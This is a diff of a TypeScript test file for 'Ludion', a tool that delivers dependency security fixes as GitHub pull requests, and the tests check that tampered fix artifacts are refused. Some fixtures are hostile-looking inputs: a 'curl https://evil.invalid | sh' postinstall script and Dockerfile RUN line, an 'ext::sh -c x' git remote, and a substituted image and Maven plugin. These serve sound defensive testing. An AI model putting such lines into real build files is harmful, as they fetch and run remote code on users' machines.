@@ -8,23 +8,29 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { describe, expect, it } from "vitest";
 import { fixBranch, gitBase } from "../src/security/branch.ts";
-import { BUNDLE_LIMIT, checkArtifact, openFixes, packFixes, pullRequestBody } from "../src/security/deliver.ts";
+import { BUNDLE_LIMIT, checkArtifact, contentProblem, openFixes, packFixes, pullRequestBody, pushInvocation, type CheckedFix } from "../src/security/deliver.ts";
+import { changedManifest } from "../src/security/inventory.ts";
+import type { Judgement } from "../src/security/judge.ts";
 import { snapshot } from "../src/security/project.ts";
 import { commit, git } from "./git.ts";
 
 const ID = "0f1e2d3c-4b5a-4968-8776-655443322110";
 const sha256 = (text: string) => createHash("sha256").update(text).digest("hex");
+const PKG = "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.20\"}}\n";
+const PKG_FIXED = "{\n  \"name\": \"app\",\n  \"dependencies\": {\n    \"lodash\": \"4.17.21\"\n  }\n}\n";
 const LOCK = "{\n  \"name\": \"app\",\n  \"lockfileVersion\": 3,\n  \"packages\": { \"node_modules/lodash\": { \"version\": \"4.17.20\" } }\n}\n";
 const FIXED = LOCK.replace("4.17.20", "4.17.21");
 const SUBJECT = "ludion: lodash 4.17.20 -> 4.17.21 (npm)";
 const BRANCH = "ludion/npm/lodash-4.17.21";
-const message = (subject = SUBJECT, id = ID) => `${subject}\n\nFixes GHSA-35jh-r3h4-6jhm.\n\nLudion receipt ${id}: the project's test passed on the base and on this change alone, offline in Docker.\n`;
+/** The message dependency-patch.ts writes for the fixture's fix. */
+const message = (base: string, subject = SUBJECT, extra = "") => `${subject}\n\nFixes GHSA-35jh-r3h4-6jhm, CVE-2021-23337.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change alone, offline in Docker.\nSource dependency files only; production was not changed.\n${extra}`;
+const READY = async () => ({ verdict: "ready_except_build", findings: [] }) as unknown as Judgement;
 
 /** A project (npm policy) with two commits, and an origin it was pushed to. `base` is the second commit. */
 function project() {
   const work = mkdtempSync(join(tmpdir(), "ludion-deliver-work-"));
   writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, ecosystem: "npm", image: "node:24-slim", test: ["npm", "test"], timeout_seconds: 60 })}\n`);
-  writeFileSync(join(work, "package.json"), "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.20\"}}\n");
+  writeFileSync(join(work, "package.json"), PKG);
   writeFileSync(join(work, "package-lock.json"), LOCK);
   writeFileSync(join(work, "README.md"), "app\n");
   const first = commit(work);
@@ -38,21 +44,21 @@ function project() {
 }
 
 /** The fix branch as `patch --apply` makes it (branch.ts), and the receipt that names it. */
-function applied(work: string, options: { content?: string; subject?: string } = {}) {
+function applied(work: string) {
   const copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
   snapshot(work, copy);
-  const base = gitBase(work, copy), content = options.content ?? FIXED;
-  const made = fixBranch(base, BRANCH, [{ path: "package-lock.json", content }], message(options.subject));
-  return { commit: made, receipt: receiptFor(base.commit, made, content) };
+  const base = gitBase(work, copy);
+  const made = fixBranch(base, BRANCH, [{ path: "package.json", content: PKG_FIXED }, { path: "package-lock.json", content: FIXED }], message(base.commit));
+  return { commit: made, receipt: receiptFor(base.commit, made) };
 }
-function receiptFor(base: string, made: string, content = FIXED): Record<string, unknown> {
+function receiptFor(base: string, made: string, lock = FIXED, pkg = PKG_FIXED): Record<string, unknown> {
   return {
     schema: 2, id: ID, ecosystem: "npm", scope: "dependency_files_only_not_deployed", outcome: "partial", baseline_passed: true, base_commit: base,
     fixes: [
       {
         package: "lodash", changes: [{ name: "lodash", from: "4.17.20", to: "4.17.21", advisories: ["GHSA-35jh-r3h4-6jhm", "CVE-2021-23337"] }],
         outcome: "applied", branch: BRANCH, commit: made, candidate_passed: true,
-        files: [{ path: "package-lock.json", before_hash: sha256(LOCK), after_hash: sha256(content) }],
+        files: [{ path: "package.json", before_hash: sha256(PKG), after_hash: sha256(pkg) }, { path: "package-lock.json", before_hash: sha256(LOCK), after_hash: sha256(lock) }],
         fix_published_at: "2021-02-20T15:42:16.891Z", fix_published_note: "registry", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
         judgement: { verdict: "ready_except_build" },
       },
@@ -68,32 +74,35 @@ function artifact(work: string, receipt: unknown, refs: string[], base: string):
   if (refs.length) git(work, "bundle", "create", "-q", join(out, "fixes.bundle"), ...refs, `^${base}`);
   return out;
 }
-/** The PR job's checkout: a fresh clone of origin at the base, with no fix branch. */
+/** The PR job's checkout as actions/checkout makes it: depth 1, at the base, HEAD detached, no fix branch. */
 function checkout(origin: string): string {
   const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pr-"));
-  git(dir, "clone", "-q", origin, ".");
+  git(dir, "clone", "-q", "--depth", "1", `file://${origin}`, ".");
+  git(dir, "checkout", "-q", "--detach");
   return dir;
 }
 
-/** A commit made by hand in `work`: any parent, files, file mode and author, on a branch. */
-function forge(work: string, branch: string, parent: string, files: Record<string, string>, options: { mode?: string; author?: string; subject?: string } = {}): string {
-  const index = join(mkdtempSync(join(tmpdir(), "ludion-deliver-index-")), "index"), env = { ...process.env, GIT_INDEX_FILE: index };
+/** A commit made by hand in `work`: any parent, files (the fix's two by default), file mode, author and message. */
+function forge(work: string, branch: string, parent: string, files: Record<string, string>, options: { mode?: string; author?: string; subject?: string; base?: string; extra?: string; date?: string } = {}): string {
+  const index = join(mkdtempSync(join(tmpdir(), "ludion-deliver-index-")), "index");
+  const env = { ...process.env, GIT_INDEX_FILE: index, GIT_AUTHOR_NAME: options.author ?? "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid", ...(options.date ? { GIT_AUTHOR_DATE: options.date, GIT_COMMITTER_DATE: options.date } : {}) };
   const run = (args: string[], input?: string) => {
-    const r = spawnSync("git", args, { cwd: work, env: { ...env, GIT_AUTHOR_NAME: options.author ?? "Ludion", GIT_AUTHOR_EMAIL: "ludion@ludion.invalid", GIT_COMMITTER_NAME: "Ludion", GIT_COMMITTER_EMAIL: "ludion@ludion.invalid" }, input, encoding: "utf8" });
+    const r = spawnSync("git", args, { cwd: work, env, input, encoding: "utf8" });
     if (r.status !== 0) throw new Error(r.stderr);
     return r.stdout.trim();
   };
   run(["read-tree", parent]);
-  for (const [path, content] of Object.entries(files)) run(["update-index", "--add", "--cacheinfo", options.mode ?? "100644", run(["hash-object", "-w", "--stdin"], content), path]);
-  const made = run(["commit-tree", run(["write-tree"]), "-p", parent, "-F", "-"], message(options.subject));
+  for (const [path, content] of Object.entries({ "package.json": PKG_FIXED, ...files })) run(["update-index", "--add", "--cacheinfo", options.mode ?? "100644", run(["hash-object", "-w", "--stdin"], content), path]);
+  const made = run(["commit-tree", run(["write-tree"]), "-p", parent, "-F", "-"], message(options.base ?? parent, options.subject, options.extra));
   run(["update-ref", `refs/heads/${branch}`, made]);
   return made;
 }
 
-/** A stand-in for GitHub's API: the repository, PRs by head branch, branches read from the origin, and new PRs. */
-function github(origin: string, pulls: { number: number; state: string; head: { ref: string } }[] = []) {
+/** A stand-in for GitHub's API: the repository, PRs by head branch, branches and commits read from the origin, new PRs. */
+function github(origin: string, pulls: { number: number; state: string; head: { ref: string } }[] = [], options: { refuse?: boolean } = {}) {
   const calls: string[] = [], opened: Record<string, unknown>[] = [];
   const reply = (status: number, body: unknown) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
+  const read = (args: string[]) => spawnSync("git", args, { cwd: origin, encoding: "utf8" });
   const fetchFn = (async (url: string | URL | Request, init?: RequestInit) => {
     const u = new URL(String(url)), method = init?.method ?? "GET";
     calls.push(`${method} ${u.pathname}${u.search}`);
@@ -101,11 +110,17 @@ function github(origin: string, pulls: { number: number; state: string; head: { 
     if (u.pathname === "/repos/o/r") return reply(200, { default_branch: "main" });
     if (u.pathname === "/repos/o/r/pulls" && method === "GET") return reply(200, pulls.filter(p => `o:${p.head.ref}` === u.searchParams.get("head")));
     if (u.pathname.startsWith("/repos/o/r/git/ref/heads/")) {
-      const branch = decodeURIComponent(u.pathname.slice("/repos/o/r/git/ref/heads/".length));
-      const r = spawnSync("git", ["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`], { cwd: origin, encoding: "utf8" });
+      const branch = decodeURIComponent(u.pathname.slice("/repos/o/r/git/ref/heads/".length)), r = read(["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`]);
       return r.status === 0 ? reply(200, { ref: `refs/heads/${branch}`, object: { sha: r.stdout.trim() } }) : reply(404, { message: "Not Found" });
     }
+    if (u.pathname.startsWith("/repos/o/r/git/commits/")) {
+      const r = read(["log", "-1", "--format=%T %P", u.pathname.slice("/repos/o/r/git/commits/".length)]);
+      if (r.status !== 0) return reply(404, { message: "Not Found" });
+      const [tree, ...parents] = r.stdout.trim().split(" ");
+      return reply(200, { tree: { sha: tree }, parents: parents.map(sha => ({ sha })) });
+    }
     if (u.pathname === "/repos/o/r/pulls" && method === "POST") {
+      if (options.refuse) return reply(403, { message: "GitHub Actions is not permitted to create or approve pull requests." });
       const body = JSON.parse(String(init?.body));
       opened.push(body);
       const pr = { number: 100 + pulls.length, state: "open", head: { ref: body.head } };
@@ -116,8 +131,8 @@ function github(origin: string, pulls: { number: number; state: string; head: { 
   }) as typeof fetch;
   return { fetchFn, calls, opened, pulls };
 }
-const open = (dir: string, out: string, base: string, origin: string, gh: ReturnType<typeof github>, ref = "refs/heads/main") =>
-  openFixes({ dir, artifact: out, base, repo: "o/r", ref, api: "https://api.github.invalid", remote: origin, token: "t0ken", fetchFn: gh.fetchFn });
+const open = (dir: string, out: string, base: string, origin: string, gh: ReturnType<typeof github>, ref = "refs/heads/main", extra: Partial<Parameters<typeof openFixes>[0]> = {}) =>
+  openFixes({ dir, artifact: out, base, repo: "o/r", ref, api: "https://api.github.invalid", remote: origin, token: "t0ken", fetchFn: gh.fetchFn, judgeNpm: READY, ...extra });
 const branchAt = (origin: string, branch: string) => spawnSync("git", ["rev-parse", "--verify", "--quiet", `refs/heads/${branch}`], { cwd: origin, encoding: "utf8" }).stdout.trim();
 
 describe("the validation job packs the applied fixes", () => {
@@ -153,7 +168,7 @@ describe("the PR job opens one PR per fix", () => {
     expect(gh.opened).toHaveLength(1);
     expect(gh.opened[0]).toMatchObject({ title: SUBJECT, head: BRANCH, base: "main", maintainer_can_modify: false });
     const body = String(gh.opened[0]!.body);
-    for (const part of ["`lodash` (npm)", "`4.17.20` → `4.17.21`", "`GHSA-35jh-r3h4-6jhm`, `CVE-2021-23337`", "`2021-02-20T15:42:16.891Z`", "`2026-10-30T01:00:00.000Z`", "`2026-10-30T01:05:00.000Z`", `\`${ID}\``, "`ready_except_build`", "not all four gates", "Ludion does not merge this PR"]) expect(body).toContain(part);
+    for (const part of ["`lodash` (npm)", "`4.17.20` → `4.17.21`", "`GHSA-35jh-r3h4-6jhm`, `CVE-2021-23337`", "`2021-02-20T15:42:16.891Z`", "`2026-10-30T01:00:00.000Z`", "`2026-10-30T01:05:00.000Z`", `\`${ID}\``, "`ready_except_build`", "in both jobs", "not all four gates", "Ludion does not merge this PR"]) expect(body).toContain(part);
     expect(body).not.toMatch(/passed the four gates|minimist/);
     // The next scheduled run validates the same fix again; its PR is open, so nothing is pushed or opened.
     const again = await open(checkout(origin), out, base, origin, gh);
@@ -161,32 +176,76 @@ describe("the PR job opens one PR per fix", () => {
     expect(gh.opened).toHaveLength(1);
     expect(gh.calls.filter(c => c.startsWith("POST"))).toHaveLength(1);
   });
-  it("does not open a fix again whose PR was closed, nor move a branch that holds another commit", async () => {
+  it("does not open a fix again whose PR was closed, nor move a branch that holds another change", async () => {
     const { work, origin, base } = project(), fix = applied(work);
     const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
     const closed = github(origin, [{ number: 7, state: "closed", head: { ref: BRANCH } }]);
     expect((await open(checkout(origin), out, base, origin, closed)).deliveries).toEqual([{ package: "lodash", branch: BRANCH, outcome: "closed_pr_exists", pr: 7, reason: "A PR from this branch was closed; it is not opened again." }]);
     expect(closed.opened).toHaveLength(0);
     expect(branchAt(origin, BRANCH)).toBe("");
-    // The branch exists on GitHub at another commit (an older base): it is left alone, and no PR is opened.
+    // The branch exists on GitHub at another commit (here the base itself): it is left alone, no PR, and the fix fails.
     git(work, "push", "-q", origin, `${base}:refs/heads/${BRANCH}`);
     const gh = github(origin), result = await open(checkout(origin), out, base, origin, gh);
-    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
+    expect(result.deliveries[0]).toMatchObject({ outcome: "branch_differs", reason: expect.stringContaining("delete it, and the next run pushes this fix") });
     expect(branchAt(origin, BRANCH)).toBe(base);
     expect(gh.opened).toHaveLength(0);
+    // On the same base, with another change (a lockfile that is not this fix's): also left alone, no PR.
+    const other = forge(work, "ludion/other", base, { "package-lock.json": FIXED.replace("\"app\"", "\"other\"") });
+    git(work, "push", "-q", origin, `${other}:refs/heads/ludion/other`);
+    git(origin, "update-ref", `refs/heads/${BRANCH}`, other);
+    const gh2 = github(origin), sameBase = await open(checkout(origin), out, base, origin, gh2);
+    expect(sameBase.deliveries[0]).toMatchObject({ outcome: "branch_differs" });
+    expect(branchAt(origin, BRANCH)).toBe(other);
+    expect(gh2.opened).toHaveLength(0);
+  });
+  it("after a PR GitHub would not open, the next run opens it from the branch an earlier run pushed", async () => {
+    const { work, origin, base } = project(), fix = applied(work);
+    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
+    // Run 1: pushed, and GitHub refuses the PR (Actions may not open PRs in this repository).
+    const refusing = github(origin, [], { refuse: true });
+    const first = await open(checkout(origin), out, base, origin, refusing);
+    expect(first.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("the next run opens the PR from it") });
+    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
+    // Run 2 validated the same fix again, so its commit differs (another time); the branch on GitHub has the same tree on
+    // the same base, so the PR is opened from it, without a push.
+    const later = forge(work, BRANCH, base, { "package-lock.json": FIXED }, { date: "2030-01-01T00:00:00Z" });
+    expect(later).not.toBe(fix.commit);
+    expect(git(work, "rev-parse", `${later}^{tree}`)).toBe(git(work, "rev-parse", `${fix.commit}^{tree}`));
+    const out2 = artifact(work, receiptFor(base, later), [`refs/heads/${BRANCH}`], base);
+    const pushes: string[] = [], gh = github(origin);
+    const result = await open(checkout(origin), out2, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
+    expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
+    expect(pushes).toEqual([]);
+    expect(branchAt(origin, BRANCH)).toBe(fix.commit);
   });
   it("opens the PR without pushing when the branch is already at the fix's commit, and a failed push stops only that fix", async () => {
     const { work, origin, base } = project(), fix = applied(work);
     const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
     git(work, "push", "-q", origin, `${fix.commit}:refs/heads/${BRANCH}`);
     const pushes: string[] = [], gh = github(origin);
-    const result = await openFixes({ dir: checkout(origin), artifact: out, base, repo: "o/r", ref: "refs/heads/main", api: "https://api.github.invalid", remote: origin, token: "t0ken", fetchFn: gh.fetchFn, push: (_t, _r, c) => { pushes.push(c); } });
+    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { push: (_t, _r, c) => { pushes.push(c); } });
     expect(result.deliveries[0]).toMatchObject({ outcome: "opened" });
     expect(pushes).toEqual([]);
     const fresh = project(), second = applied(fresh.work), gh2 = github(fresh.origin);
-    const failing = await openFixes({ dir: checkout(fresh.origin), artifact: artifact(fresh.work, second.receipt, [`refs/heads/${BRANCH}`], fresh.base), base: fresh.base, repo: "o/r", ref: "refs/heads/main", api: "https://api.github.invalid", remote: fresh.origin, token: "t0ken", fetchFn: gh2.fetchFn, push: () => { throw new Error("git push failed: rejected"); } });
+    const failing = await open(checkout(fresh.origin), artifact(fresh.work, second.receipt, [`refs/heads/${BRANCH}`], fresh.base), fresh.base, fresh.origin, gh2, "refs/heads/main", { push: () => { throw new Error("git push failed: rejected"); } });
     expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: "git push failed: rejected" });
     expect(gh2.opened).toHaveLength(0);
+  });
+  it("runs the judge again on the lockfile, and pushes nothing when it does not say ready_except_build", async () => {
+    const { work, origin, base } = project(), fix = applied(work), gh = github(origin), seen: string[][] = [];
+    const out = artifact(work, fix.receipt, [`refs/heads/${BRANCH}`], base);
+    const stop = async (before: string, after: string) => {
+      seen.push([readFileSync(join(before, "package-lock.json"), "utf8"), readFileSync(join(after, "package-lock.json"), "utf8")]);
+      return { verdict: "stop", findings: [{ gate: 2, effect: "stop", message: "lodash@4.17.21 has an install script" }] } as unknown as Judgement;
+    };
+    const result = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: stop });
+    expect(seen).toEqual([[LOCK, FIXED]]);
+    expect(result.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("gate 2: lodash@4.17.21 has an install script") });
+    expect(branchAt(origin, BRANCH)).toBe("");
+    expect(gh.opened).toHaveLength(0);
+    const failing = await open(checkout(origin), out, base, origin, gh, "refs/heads/main", { judgeNpm: async () => { throw new Error("registry unreachable"); } });
+    expect(failing.deliveries[0]).toMatchObject({ outcome: "failed", reason: expect.stringContaining("could not judge: registry unreachable") });
+    expect(branchAt(origin, BRANCH)).toBe("");
   });
   it.skipIf(process.platform === "win32")("keeps a file's executable mode from the base (a checkout from a file system without modes)", async () => {
     const { work, origin } = project();
@@ -204,12 +263,25 @@ describe("the PR job opens one PR per fix", () => {
     expect(gh.calls).toEqual(["GET /repos/o/r"]);
     expect(branchAt(origin, BRANCH)).toBe("");
   });
+  it("pushes with a plain refspec, the token only in Git's environment, and only to a ludion/ branch", () => {
+    const remote = "https://github.com/o/r.git", commit = "a".repeat(40);
+    const { args, env } = pushInvocation("/top", remote, commit, BRANCH, "t0ken", "/hooks", { PATH: "/bin", GIT_DIR: "/elsewhere", GIT_SSH_COMMAND: "evil" });
+    expect(args.slice(-5)).toEqual(["push", "--no-verify", "--porcelain", remote, `${commit}:refs/heads/${BRANCH}`]);
+    expect(args.join(" ")).not.toMatch(/t0ken|--force|\+[0-9a-f]{40}/);
+    expect(args).toEqual(expect.arrayContaining(["core.hooksPath=/hooks", "protocol.allow=never", "protocol.https.allow=always", "credential.helper="]));
+    expect(env).toMatchObject({ GIT_ALLOW_PROTOCOL: "https", GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: `http.${remote}.extraheader`, GIT_CONFIG_VALUE_0: `AUTHORIZATION: basic ${Buffer.from("x-access-token:t0ken").toString("base64")}`, PATH: "/bin" });
+    expect(env.GIT_DIR).toBeUndefined();
+    expect(env.GIT_SSH_COMMAND).toBeUndefined();
+    expect(() => pushInvocation("/top", remote, commit, "main", "t0ken", "/hooks")).toThrow("Only a fix commit goes to a ludion/ branch");
+    expect(() => pushInvocation("/top", "http://github.com/o/r.git", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
+    expect(() => pushInvocation("/top", "ext::sh -c x", commit, BRANCH, "t0ken", "/hooks")).toThrow("https URL or an absolute path");
+  });
 });
 
 describe("the PR job refuses an artifact the validation job would not write", () => {
   /** Runs the PR job on a forged artifact: it must throw `why`, push nothing and open nothing. */
   async function refused(setup: (p: ReturnType<typeof project>) => { receipt: unknown; refs: string[]; base?: string; tamper?: (out: string) => void }, why: string | RegExp) {
-    const p = project(), s = setup(p), out = artifact(p.work, s.receipt, s.refs, p.base);
+    const p = project(), s = setup(p), out = artifact(p.work, s.receipt, s.refs, s.base ?? p.base);
     s.tamper?.(out);
     const gh = github(p.origin);
     await expect(open(checkout(p.origin), out, s.base ?? p.base, p.origin, gh)).rejects.toThrow(why);
@@ -217,18 +289,18 @@ describe("the PR job refuses an artifact the validation job would not write", ()
     expect(git(p.origin, "for-each-ref", "--format=%(refname)")).toBe("refs/heads/main");
   }
   it("a commit whose parent is not the base", () => refused(p => {
-    const made = forge(p.work, BRANCH, p.first, { "package-lock.json": FIXED });
+    const made = forge(p.work, BRANCH, p.first, { "package-lock.json": FIXED }, { base: p.base });
     return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
   }, /does not have the base [0-9a-f]{12} as its only parent|needs commits other than the base/));
   it("two commits on the base, not one", () => refused(p => {
     const middle = forge(p.work, "ludion/x", p.base, { "package-lock.json": LOCK.replace("app", "app2") });
-    const made = forge(p.work, BRANCH, middle, { "package-lock.json": FIXED });
+    const made = forge(p.work, BRANCH, middle, { "package-lock.json": FIXED }, { base: p.base });
     return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
   }, "does not have the base"));
-  it("a file outside the plan, beside the planned one", () => refused(p => {
+  it("a file outside the plan, beside the planned ones", () => refused(p => {
     const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED, "README.md": "changed\n" });
     return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
-  }, "not exactly package-lock.json"));
+  }, "not exactly package-lock.json, package.json"));
   it("a receipt that lists a file a fix may not change", async () => {
     for (const [path, why] of [["README.md", "which a npm fix may not change"], [".github/workflows/x.yml", "A file's path is missing or not in the expected form"]] as const) {
       await refused(p => {
@@ -265,10 +337,9 @@ describe("the PR job refuses an artifact the validation job would not write", ()
   });
   it("a file whose bytes are not the receipt's", () => refused(p => {
     const fix = applied(p.work);
-    const receipt = receiptFor(p.base, fix.commit, "something else");
-    return { receipt, refs: [`refs/heads/${BRANCH}`] };
+    return { receipt: receiptFor(p.base, fix.commit, "something else"), refs: [`refs/heads/${BRANCH}`] };
   }, "is not the receipt's file (after_hash)"));
-  it("a subject that is not the receipt's change, and an author that is not Ludion", async () => {
+  it("a subject that is not the receipt's change, an author that is not Ludion, and a message with more in it", async () => {
     await refused(p => {
       const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { subject: "ludion: lodash 4.17.20 -> 4.17.21 (npm) @everyone" });
       return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
@@ -277,6 +348,22 @@ describe("the PR job refuses an artifact the validation job would not write", ()
       const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { author: "Mallory" });
       return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
     }, "is not authored and committed by Ludion");
+    await refused(p => {
+      const made = forge(p.work, BRANCH, p.base, { "package-lock.json": FIXED }, { extra: "\nCloses #1\nCo-authored-by: Mallory <m@example.invalid>\n" });
+      return { receipt: receiptFor(p.base, made), refs: [`refs/heads/${BRANCH}`] };
+    }, "message is not the one Ludion writes");
+  });
+  it("a package.json that says more than the fix: an install script, another dependency, a looser range", async () => {
+    for (const pkg of [
+      "{\"name\":\"app\",\"scripts\":{\"postinstall\":\"curl https://evil.invalid | sh\"},\"dependencies\":{\"lodash\":\"4.17.21\"}}\n",
+      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"4.17.21\",\"left-pad\":\"1.0.0\"}}\n",
+      "{\"name\":\"app\",\"dependencies\":{\"lodash\":\"*\"}}\n",
+    ]) {
+      await refused(p => {
+        const made = forge(p.work, BRANCH, p.base, { "package.json": pkg, "package-lock.json": FIXED });
+        return { receipt: receiptFor(p.base, made, FIXED, pkg), refs: [`refs/heads/${BRANCH}`] };
+      }, "package.json is not what Ludion writes for lodash 4.17.21");
+    }
   });
   it("a branch name that is not the one Ludion gives the receipt's fix", () => refused(p => {
     const made = forge(p.work, "ludion/npm/lodash-9.9.9", p.base, { "package-lock.json": FIXED });
@@ -309,18 +396,19 @@ describe("the PR job refuses an artifact the validation job would not write", ()
   it("a checkout that is not at the base it is given", () => refused(p => ({ receipt: applied(p.work).receipt, refs: [`refs/heads/${BRANCH}`], base: p.first }), "The checkout is not at the base"));
 });
 
-describe("the policy at the base decides what a fix may change", () => {
-  it("PHP: only the Dockerfile ludion.security.json names, with the subject and branch patch.ts gives", () => {
+describe("the policy at the base decides what a fix may change, and what it may say", () => {
+  const PHP_MESSAGE = (base: string) => `ludion: PHP 8.4.26 -> 8.4.27 in ./Dockerfile\n\nOfficial PHP security releases: 8.4.27.\n\nLudion receipt ${ID}: the project's test passed on ${base.slice(0, 12)} and on this change, offline in Docker.\nSource Dockerfile only; production was not changed.\n`;
+  it("PHP: only the Dockerfile ludion.security.json names, with the subject, message and branch patch.ts gives", () => {
     const work = mkdtempSync(join(tmpdir(), "ludion-deliver-php-"));
     writeFileSync(join(work, "ludion.security.json"), `${JSON.stringify({ schema: 1, dockerfile: "./Dockerfile", test: ["php", "tests/smoke.php"], timeout_seconds: 60 })}\n`);
-    writeFileSync(join(work, "Dockerfile"), "FROM php:8.4.26-cli-alpine\n");
+    writeFileSync(join(work, "Dockerfile"), "FROM php:8.4.26-cli-alpine\nWORKDIR /app\n");
     const base = commit(work), copy = mkdtempSync(join(tmpdir(), "ludion-deliver-copy-"));
     snapshot(work, copy);
-    const after = "FROM php:8.4.27-cli-alpine@sha256:" + "1".repeat(64) + "\n";
-    const made = fixBranch(gitBase(work, copy), "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], message("ludion: PHP 8.4.26 -> 8.4.27 in ./Dockerfile"));
+    const after = `FROM php:8.4.27-cli-alpine@sha256:${"1".repeat(64)}\nWORKDIR /app\n`;
+    const made = fixBranch(gitBase(work, copy), "ludion/php/8.4.27", [{ path: "Dockerfile", content: after }], PHP_MESSAGE(base));
     const receipt = {
       schema: 1, id: ID, scope: "dockerfile_only_not_deployed", outcome: "applied", baseline_passed: true, candidate_passed: true, base_commit: base,
-      scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" } }, dockerfile_after: sha256(after),
+      scan: { current: { version: "8.4.26" }, candidate: { version: "8.4.27" }, security_releases: [{ version: "8.4.27", date: "23 Oct 2026" }] }, dockerfile_after: sha256(after),
       branch: "ludion/php/8.4.27", commit: made, fix_published_at: "2026-10-23T00:00:00.000Z", found_at: "2026-10-30T01:00:00.000Z", applied_at: "2026-10-30T01:05:00.000Z",
     };
     const out = artifact(work, receipt, ["refs/heads/ludion/php/8.4.27"], base);
@@ -332,5 +420,59 @@ describe("the policy at the base decides what a fix may change", () => {
     git(work, "commit", "-qam", "composer policy");
     const composerBase = git(work, "rev-parse", "HEAD");
     expect(() => checkArtifact(work, artifact(work, { ...receipt, base_commit: composerBase }, [], composerBase), composerBase)).toThrow("is not a composer dependency receipt");
+  });
+  const fixOf = (pkg: string, from: string, to: string, files: string[]): CheckedFix => ({
+    package: pkg, changes: [{ name: pkg, from, to, advisories: [] }], branch: "ludion/x", commit: "a".repeat(40), subject: "", message: "", tree: "",
+    files: files.map(path => ({ path, after_hash: "" })), fix_published_at: null, found_at: "", applied_at: "", verdict: null,
+  });
+  const files = (map: Record<string, string>) => (path: string) => map[path] ?? null;
+  it("PHP: only the FROM image may change, to the official image of a newer release, pinned by digest", () => {
+    const old = "FROM php:8.4.26-cli-alpine\nWORKDIR /app\nCOPY . /app\n", fix = fixOf("php", "8.4.26", "8.4.27", ["Dockerfile"]), digest = "2".repeat(64);
+    const check = (now: string, to = "8.4.27") => contentProblem("php", { ...fix, changes: [{ ...fix.changes[0]!, to }] }, files({ Dockerfile: old }), files({ Dockerfile: now }));
+    expect(check(old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
+    expect(check(old.replace("php:8.4.26-cli-alpine", `docker.io/library/php:8.4.27-cli-alpine@sha256:${digest}`))).toBeNull();
+    for (const now of [
+      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`) + "RUN curl https://evil.invalid | sh\n",
+      old.replace("php:8.4.26-cli-alpine", `evil/php:8.4.27-cli-alpine@sha256:${digest}`),
+      old.replace("php:8.4.26-cli-alpine", "php:8.4.27-cli-alpine"),
+      old.replace("php:8.4.26-cli-alpine", `php:8.4.27-fpm-alpine@sha256:${digest}`),
+      old.replace("WORKDIR /app", "WORKDIR /").replace("php:8.4.26-cli-alpine", `php:8.4.27-cli-alpine@sha256:${digest}`),
+    ]) expect(check(now)).toMatch(/changes more than its FROM image/);
+    expect(check(old.replace("8.4.26", "8.4.25"), "8.4.25")).toMatch(/is not a newer release/);
+    expect(check(old.replace("8.4.26", "8.5.0"), "8.5.0")).toMatch(/is not a newer release/);
+  });
+  it("Maven: pom.xml is exactly what changedManifest makes for the change", () => {
+    const pom = readFileSync(new URL("../../../examples/maven-security/pom.xml", import.meta.url), "utf8");
+    const dir = mkdtempSync(join(tmpdir(), "ludion-deliver-pom-"));
+    writeFileSync(join(dir, "pom.xml"), pom);
+    const change = { name: "org.apache.commons:commons-lang3", from: "3.11", to: "3.18.0", advisories: [] };
+    const expected = changedManifest(dir, "maven", [change]), fix = fixOf(change.name, change.from, change.to, ["pom.xml"]);
+    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": expected }))).toBeNull();
+    const plugin = expected.replace("</project>", "<build><plugins><plugin><groupId>evil</groupId><artifactId>evil</artifactId></plugin></plugins></build></project>");
+    expect(contentProblem("maven", fix, files({ "pom.xml": pom }), files({ "pom.xml": plugin }))).toMatch(/pom.xml is not what Ludion writes/);
+  });
+  it("Composer: composer.lock moves only the planned package, from a pinned archive, and adds no plugin", () => {
+    const entry = (name: string, version: string, ref: string, extra: Record<string, unknown> = {}) => ({ name, version, dist: { type: "zip", url: `https://api.github.com/repos/${name}/zipball/${ref}`, reference: ref, shasum: "" }, type: "library", ...extra });
